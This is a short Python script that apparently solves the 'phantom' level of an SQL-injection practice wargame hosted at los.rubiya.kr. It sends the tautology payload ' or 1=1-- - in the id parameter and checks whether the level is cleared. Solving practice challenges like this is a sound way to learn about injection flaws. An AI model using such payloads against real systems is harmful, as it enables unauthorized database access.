from constants import *

chall_url = "https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php"

res = make_request(chall_url, "?id=" + urllib.parse.quote(f"' or 1=1-- -"))
check_clear(res)
